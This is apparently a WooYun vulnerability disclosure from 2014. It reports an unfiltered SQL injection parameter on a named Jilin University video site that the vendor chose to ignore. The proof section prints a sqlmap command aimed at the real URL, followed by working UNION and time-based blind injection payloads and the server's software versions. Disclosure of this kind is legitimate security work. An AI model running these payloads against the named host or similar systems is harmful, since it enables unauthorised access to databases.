wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2014-03-04：	细节已通知厂商并且等待厂商处理中									2014-03-14：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： SQL注入 详细说明：   URL：http://tv.jlu.edu.cn:80/v2/index.php?o=showc;id=1，参数id没有过滤。   漏洞证明：  扫描报告
python sqlmap/sqlmap.py -u "http://tv.jlu.edu.cn/v2/index.php?o=showc;id=1*"    sqlmap/1.0-dev-ab36e5a - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 11:04:16custom injection marking character ('*') found in option '-u'. Do you want to process it? [Y/n/q] y[11:04:18] [INFO] resuming back-end DBMS 'mysql' [11:04:18] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: URIParameter: #1*    Type: UNION query    Title: MySQL UNION query (NULL) - 5 columns    Payload: http://tv.jlu.edu.cn:80/v2/index.php?o=showc;id=-9982 UNION ALL SELECT NULL,CONCAT(0x7161666d71,0x47434853676e71647a62,0x7175786571),NULL,NULL,NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: http://tv.jlu.edu.cn:80/v2/index.php?o=showc;id=1 AND SLEEP(5)---[11:04:18] [INFO] the back-end DBMS is MySQLweb application technology: Apache 2.2.10, PHP 5.2.9back-end DBMS: MySQL 5.0.11[11:04:18] [INFO] fetched data logged to text files under 'XXX'[*] shutting down at 11:04:18

wybug_reply: 漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-03-14 16:08 厂商回复：  最新状态： 暂无
